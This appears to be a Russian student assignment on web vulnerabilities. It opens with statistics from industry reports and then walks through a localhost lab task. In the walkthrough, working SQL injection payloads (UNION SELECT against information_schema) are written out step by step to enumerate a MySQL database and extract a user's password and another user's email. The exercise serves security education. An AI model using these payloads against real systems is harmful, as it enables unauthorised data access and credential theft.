## Часть 1

1. Ссылки на источники

- [Edgescan Vulnerability Statistics Report 2024](https://www.edgescan.com/wp-content/uploads/2025/04/2024-Vulnerability-Statistics-Report.pdf)

- [Edgescan Vulnerability Statistics Report 2025](https://info.edgescan.com/hubfs/23DOWNLOADABLE%20CONTENT/Vulnerability%20Statistics%20Reports/Edgescan_VulnerabilityStatsReport_2025.pdf)

- [Web Application Security Statistics (WASC)](https://projects.webappsec.org/Web-Application-Security-Statistics)

- [AionCloud Web Attack Trend Report 2025](https://www.aioncloud.com/2025-03-web-attack-trend-report/)

2. Доля успешных атак на организации, проведенных с помощью эксплуатации веб - уязвимостей

По данным AionCloud, примерно в 25–38% веб-атак используются уязвимости веб-приложений (в частности SQL-инъекции)

3. Распределение по конкретным уязвимостям

По данным отчётов Edgescan (2024–2025), среди критических уязвимостей веб-приложений доминируют:

- SQL-инъекции — около 19–28%
- XSS (stored) — около 10–10.5%
- загрузка вредоносных файлов — около 7%
- XSS (reflected) — около 5.5%

Также встречаются:

- brute force (~4.2%)
- path traversal (~2.7%)
- CSRF (~2.1%)

Согласно WASC, наиболее распространёнными уязвимостями в веб-приложениях в целом являются:

- Cross-Site Scripting (XSS)
- SQL Injection
- утечки информации (Information Leakage)
- ошибки конфигурации и защиты транспорта

То есть XSS и SQLi стабильно входят в число самых распространённых проблем.

Отчёт AionCloud (2025), основанный на анализе реальных атак, показывает, что:

- SQL-инъекции составляют около 25–30% атак
- также широко используются XSS и другие веб-уязвимости

Различия в процентах объясняются различиями в методологии исследований (анализ уязвимостей vs анализ реальных атак)

---

## Часть 2

На странице написано "Введите в качестве параметра ваш id"  
Пробую ввести просто рандомный айди, например, 3

`http://localhost:8080/task/?id=3`

Получаю

Ваш id:3  
Ваш логин:Matroskin

Мне нужны пользователи Volk2 и Vinni-pukh  
Пробую по порядку другие айди и нахожу этих пользователей

Ваш id:4  
Ваш логин:Vinni-pukh

Ваш id:9  
Ваш логин:Volk2

Когда ввожу айди 10, страница пустая  
Тогда у нас 9 пользователей

Проверим, есть ли уязвимость  
Ввожу `http://localhost:8080/task/?id=1'`

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1

Получается уязвимость есть  
Тогда надо узнать сколько колонок в таблице  
Пробую через order by

`http://localhost:8080/task/?id=1 order by 1--`

Сработало

Тогда пробую

`http://localhost:8080/task/?id=1 order by 2--`
 
Увеличиваю постепенно до 30  
Но 30 колонок как-то слишком много, думаю, что-то не так  
Попробую через union

`http://localhost:8080/task/?id=1' UNION SELECT 1--`

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1

Получаю ошибку

`http://localhost:8080/task/?id=1' UNION SELECT 1,2--`

Снова ошибка

`http://localhost:8080/task/?id=1' UNION SELECT 1,2,3--`

Всё ещё ошибка, видимо, я что-то не так делаю  
Может, надо убрать кавычку

`http://localhost:8080/task/?id=1 UNION SELECT 1,2,3--`

Вывелось просто

Ваш id:1  
Ваш логин:admin

Ищу другие варианты

`http://localhost:8080/task/?id=1' UNION SELECT 1,2,3#`

Ошибка

`http://localhost:8080/task/?id=1' AND 1=2 UNION SELECT 1,2,3--`

И опять ошибка

`http://localhost:8080/task/?id=1' AND 1=2 UNION SELECT 1,2,3%23`

Получаю

Ваш id:1  
Ваш логин:2

Ура, тогда получается у нас три колонки  
Тогда надо имя бд определить

`http://localhost:8080/task/?id=1' AND 1=2 UNION SELECT 1,database(),3%23`

Ваш id:1  
Ваш логин:security

Бд называется security  
Попробую через group contact узнать названия сразу всех таблиц

`http://localhost:8080/task/?id=1' AND 1=2 UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema='security'%23`

Ваш id:1  
Ваш логин:emails,users

Так, у нас две таблицы, emails и users  
Логично, что почты в таблице emails, но интересно, какие колонки в таблице users

`http://localhost:8080/task/?id=1' AND 1=2 UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'%23`

Ваш id:1  
Ваш логин:USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password

Супер, тогда пароли здесь  
Можем узнать пароль нашего пользователя Volk2

`http://localhost:8080/task/?id=9' AND 1=2 UNION SELECT 1,password,3 FROM users WHERE username='Volk2'%23`

Ваш id:1  
Ваш логин:Wa spoiuuuuu

Ура, всё получилось, теперь второе задание  
Нужно тоже узнать колонки в таблице emails

`http://localhost:8080/task/?id=1' AND 1=2 UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='emails'%23`

Ваш id:1  
Ваш логин:id,email_id

Странно, что колонка называется email_id

`http://localhost:8080/task/?id=4' AND 1=2 UNION SELECT 1,email_id,3 FROM emails WHERE id=4%23`

Ваш id:1  
Ваш логин:honey_lover@otus-lab.com

А нет, там всё-таки почта, мы получили почту пользователя Vinni-pukh

### Получаем:

**Пароль пользователя Volk2** - Wa spoiuuuuu  
**Почта пользователя Vinni-pukh** - honey_lover@otus-lab.com